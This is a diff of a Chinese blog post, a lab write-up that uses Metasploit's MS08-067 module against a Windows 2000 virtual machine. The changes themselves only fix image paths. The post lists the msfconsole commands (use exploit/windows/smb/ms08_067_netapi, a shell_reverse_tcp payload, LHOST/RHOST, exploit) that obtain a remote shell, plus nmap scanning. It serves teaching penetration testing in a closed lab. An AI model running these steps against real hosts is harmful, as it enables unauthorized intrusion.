@@ -3,6 +3,7 @@ layout: post
 title: "metaspolit——制毒初试"
 date: 2018-08-07 10:32:00
 author:     "许大仙"
+catalog: true
 tags:
     - 二进制安全
 ---
@@ -25,7 +26,7 @@ tags:
 
 1.在虚拟机下安装kali攻击机系统/ubuntu+msf以及windows10靶机系统/win2000靶机。
 
-![虚拟机情况](/assets/img/1.png)
+![虚拟机情况](/img/assets/img/1.png)
 
 **Kali是一个linux系统，Kali Linux预装了许多渗透测试软件，包括nmap (端口扫描器)、Wireshark (数据包分析器)、John the Ripper (密码破解器),以及Aircrack-ng (一应用于对无线局域网进行渗透测试的软件)**.用户可通过硬盘、live CD或live USB运行Kali Linux。Metasploit的Metasploit Framework支持Kali Linux，**Metasploit一套针对远程主机进行开发和执行Exploit代码的工具。**
 
@@ -35,23 +36,23 @@ tags:
 
 （1）靶机ip地址获取:在cmd中输入**ipconfig**，获取ip地址为10.211.55.3。
 
-![靶机ipconfig](/assets/img/3.png)
+![靶机ipconfig](/img/assets/img/3.png)
 
-![win2000靶机ipconfig](/assets/img/1.jpg)
+![win2000靶机ipconfig](/img/assets/img/1.jpg)
 
 （2）攻击机ip地址获取：在shell中输入**ifconfig**，获取ip地址为10.211.55.4。
 
-![攻击机ipconfig](/assets/img/4.png)
+![攻击机ipconfig](/img/assets/img/4.png)
 
-![ubuntu攻击机ipconfig](/assets/img/2.jpg)
+![ubuntu攻击机ipconfig](/img/assets/img/2.jpg)
 
 （3）可见，两台虚拟机处于同一网段下，可以互相ping通。
 
-![靶机ipconfig](/assets/img/5.png)
-![攻击机ipconfig](/assets/img/6.png)
+![靶机ipconfig](/img/assets/img/5.png)
+![攻击机ipconfig](/img/assets/img/6.png)
 
-![win靶机ipconfig](/assets/img/4.jpg)
-![ubuntu攻击机ipconfig](/assets/img/3.jpg)
+![win靶机ipconfig](/img/assets/img/4.jpg)
+![ubuntu攻击机ipconfig](/img/assets/img/3.jpg)
 
 **一般来说在unix或linux系统中会一直ping下去，这时按快捷键Ctrl+Z或Ctrl+C均可停止ping**。而win只会丢几个测试数据包，会自动结束。
 
@@ -65,7 +66,7 @@ NAT和桥接的比较: NAT模式和桥接模式虚拟机都可以上外网；由
 
 c.Host-Only。在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。**主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的**。[通过编辑-虚拟机网络编辑器可以查看到，.93.0的子网是NAT模式的，可以互相访问，而.37.0只是Host-Only，只能访问主机]
 
-![虚拟网络情况](/assets/img/5.jpg)
+![虚拟网络情况](/img/assets/img/5.jpg)
 
 
 在按步骤进行攻击操作后（详细步骤见第(三)部分），**发现作为靶机的win10系统无漏洞可攻击[比如开启445端口才可进行下述TCP链接攻击]，于是改用低版本win靶机系统进行试验，在vmware虚拟机下操作**。
@@ -75,11 +76,11 @@ c.Host-Only。在Host-Only模式下，虚拟网络是一个全封闭的网络，
 
 设置虚拟机下的kali和windows靶机系统为NAT模式。其中设置靶机ip地址为192.168.87.131，攻击机ip地址为192.168.87.129，且互相都可以ping通。[也可以用本身分配的ip，不去手动设置]
 
-![win2kServer](/assets/img/7.png)
+![win2kServer](/img/assets/img/7.png)
 
-![win2kServer](/assets/img/8.png)
+![win2kServer](/img/assets/img/8.png)
 
-![kail](/assets/img/9.png)
+![kail](/img/assets/img/9.png)
 
 
 
@@ -89,85 +90,85 @@ c.Host-Only。在Host-Only模式下，虚拟网络是一个全封闭的网络，
 
 1.在kali终端中开启msfconsole。
 
-![msfconsole](/assets/img/10.png)
+![msfconsole](/img/assets/img/10.png)
 
 2.输入命令**search** ms08_067,会显示出找到的渗透模块，如下图所示[search 查找漏洞模块]：
 
 
-![search ms08_067](/assets/img/11.png)
+![search ms08_067](/img/assets/img/11.png)
 
 3.输入命令**use** exploit/windows/smb/ms08_067_netapi，进入该**漏洞模块的使用**。
 
-![use ms08_067_netapi](/assets/img/12.png)
+![use ms08_067_netapi](/img/assets/img/12.png)
 
 4.**输入命令show payloads会显示出有效的攻击载荷**，比如shell_reverse_tcp。
 
-![shell_reverse_tcp](/assets/img/13.png)
+![shell_reverse_tcp](/img/assets/img/13.png)
 
 5.命令show targets会显示出可以被攻击的靶机的操作系统型号，如下图所示：
 
-![可被攻击的靶机的操作系统型号](/assets/img/14.png)
+![可被攻击的靶机的操作系统型号](/img/assets/img/14.png)
 
 里面有windows 2000 Universal，大多通用的win 2000都可以
 
-![ubuntu下msf使用](/assets/img/6.jpg)
+![ubuntu下msf使用](/img/assets/img/6.jpg)
 
 6.使用命令set payload generic/shell_reverse_tcp设置攻击有效载荷。
 
-![设置攻击有效载荷](/assets/img/15.png)
+![设置攻击有效载荷](/img/assets/img/15.png)
 
 
 7.输入命令show options显示我们需要在攻击前需要设置的数据。
 
-![攻击前需要设置的数据](/assets/img/16.png)
+![攻击前需要设置的数据](/img/assets/img/16.png)
 
 LHOST为攻击机ip，RHOST为靶机IP
 
 8.输入命令set LHOST "kali Ip"，即set LHOST 192.168.87.129;set RHOST "Win Ip"，即set RHOST 192.168.87.131。
 
-![参数设置](/assets/img/17.png)
+![参数设置](/img/assets/img/17.png)
 
-![ubuntu下msf使用](/assets/img/7.jpg)
+![ubuntu下msf使用](/img/assets/img/7.jpg)
 
 
 使用命令show options再次查看payload状态。
 
-![参数设置后的payload状态](/assets/img/18.png)
+![参数设置后的payload状态](/img/assets/img/18.png)
 
 9.输入命令exploit开始攻击，如下图所示是正常攻击成功结果。
 
-![命令exploit开始攻击](/assets/img/19.png)
+![命令exploit开始攻击](/img/assets/img/19.png)
 
 **这时你会发现，已经得到win的终端了出现C:\WINNT\system32**
 
 
 10.在kali上执行ipconfig/all[实际是得到win靶机终端下的结果，毕竟kali已经得win的终端了]得到如下图所示：
 
-![在kali上执行ipconfig/all](/assets/img/20.png)
+![在kali上执行ipconfig/all](/img/assets/img/20.png)
 
 在win 2000上执行同样的命令（**所得与上图相同**）如下图所示：
 
 
-![win 2000上执行ipconfig/all](/assets/img/21.png)
+![win 2000上执行ipconfig/all](/img/assets/img/21.png)
 
 11.输入“netstat -a”命令，可以查看靶机开启了哪些端口。
 
-![win 2000上执行ipconfig/all](/assets/img/22.png)
+![win 2000上执行ipconfig/all](/img/assets/img/22.png)
 
 **发现存在microsoft-ds，state是listening**。
 **在linux下用nmap命令扫描端口可知，microsoft-ds正是对应445/tcp端口**
 
-![nmap命令扫描端口](/assets/img/9.jpg)
+![nmap命令扫描端口](/img/assets/img/9.jpg)
 
 12.输入“netstat -n”命令， 查看靶机端口的网络连接情况[在kail上win终端下，或win上的终端下执行]。
 
-![查看靶机端口的网络连接](/assets/img/23.png)
+![查看靶机端口的网络连接](/img/assets/img/23.png)
 
 确实TCP链接了两台虚拟机，目的/源IP正确
 
 用ubuntu和win 2000得到的也是同样的结果：
 
-![nmap命令扫描端口](/assets/img/8.jpg)
+![nmap命令扫描端口](/img/assets/img/8.jpg)
 
 ## 五、思考 ##
 
@@ -177,11 +178,11 @@ LHOST为攻击机ip，RHOST为靶机IP
 
 比如kali中，msf的路径为/usr/share/metasploit-framework【ubuntu下为/usr/opt/metasploit-framework/embedded/framework/modules】
 
-![路径下msf](/assets/img/25.png)
+![路径下msf](/img/assets/img/25.png)
 
 比如**modules中，是我们在msf中经常会利用到的一些工具** 
 
-![路径下module2](/assets/img/26.png)
+![路径下module2](/img/assets/img/26.png)
 
 - auxiliary：辅助模块
 
@@ -211,7 +212,7 @@ LHOST为攻击机ip，RHOST为靶机IP
 
 **MS08_067是一个在windows445号端口上的漏洞，需要事先查看该端口是否开放[只有这个端口开放，才有可能进行这个漏洞的攻击]**，这里使用**“nmap -PS 靶机ip”**命令查看扫描所有开放的端口，发现445号端口开放。因此可以使用MS08_067漏洞进行exploit。
 
-![路径下module2](/assets/img/24.png)
+![路径下module2](/img/assets/img/24.png)
 
 2.实验拓展
 
